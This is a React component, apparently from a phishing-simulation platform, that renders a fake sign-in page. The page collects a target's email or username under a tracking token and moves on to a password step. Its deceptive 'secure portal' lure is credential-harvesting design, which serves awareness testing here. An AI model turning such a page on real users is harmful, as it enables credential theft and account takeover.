import { useEffect, useState } from "react";
import { useNavigate, useParams } from "react-router-dom";
import api from "../api";
import { readJson, safeSessionStorage } from "../utils/storage.js";

const sessionKey = (token) => `phishscale_flow_${token}`;

const readFlow = (token) => readJson(safeSessionStorage, sessionKey(token), {});

const writeFlow = (token, patch) => {
  const next = { ...readFlow(token), ...patch };
  safeSessionStorage.setItem(sessionKey(token), JSON.stringify(next));
  return next;
};

export default function FakeLogin() {
  const { token } = useParams();
  const navigate = useNavigate();
  const [context, setContext] = useState(null);
  const [identifier, setIdentifier] = useState("");

  useEffect(() => {
    api.get(`/track/context/${token}`).then(({ data }) => setContext(data)).catch(() => setContext(null));
  }, [token]);

  const submit = (event) => {
    event.preventDefault();
    writeFlow(token, { username: identifier.trim() });
    navigate(`/login/${token}/password`);
  };

  const title = context?.template?.landingTitle || "Secure Sign-In";

  return (
    <div className="trap-shell">
      <div className="trap-brand">
        <div className="brand-mark" />
        <span>{title}</span>
      </div>

      <form className="trap-card" onSubmit={submit}>
        <div className="progress-dots">
          <span className="active" />
          <span />
          <span />
        </div>
        <h1>Sign in</h1>
        <p className="muted">Continue to the secure portal to review your account and complete verification.</p>

        <label>
          Email, phone, or username
          <input
            value={identifier}
            onChange={(event) => setIdentifier(event.target.value)}
            placeholder="name@company.com"
            autoComplete="off"
            required
          />
        </label>

        <button className="primary-btn full-width" type="submit">
          Next
        </button>
      </form>
    </div>
  );
}
